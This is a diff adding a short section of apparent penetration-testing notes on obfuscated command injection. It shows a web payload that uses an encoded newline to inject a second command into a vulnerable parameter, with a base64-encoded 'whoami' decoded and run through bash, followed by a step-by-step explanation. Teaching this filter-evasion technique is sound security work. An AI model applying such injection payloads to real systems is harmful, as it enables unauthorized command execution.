@@ -56,6 +56,43 @@ cat /home
 
 ```
 
+# Advanced Command Injection Obfuscation
+
+```
+Vulnerable parameter > to
+
+Exploited command
+
+bash<<<$(base64 -d<<<whoami)
+
+Obfuscated command
+
+%0abash<<<$(base64%09-d<<<d2hvYW1p)
+
+bash<<< ...
+
+<<< is a here-string → it passes a string as stdin to a command.
+
+So this runs bash and feeds it a decoded command.
+
+$( ... )
+
+Command substitution → output of the command inside is executed by bash.
+
+base64 -d<<<d2hvYW1p
+
+<<<d2hvYW1p → here-string passes the string d2hvYW1p into base64 -d.
+
+base64 -d decodes it.
+
+
+```
+
+
+<img width="1552" height="486" alt="image" src="https://github.com/user-attachments/assets/50036e12-15f4-490b-8b97-3d658c263a2d" />
+
+
+
 
 
 
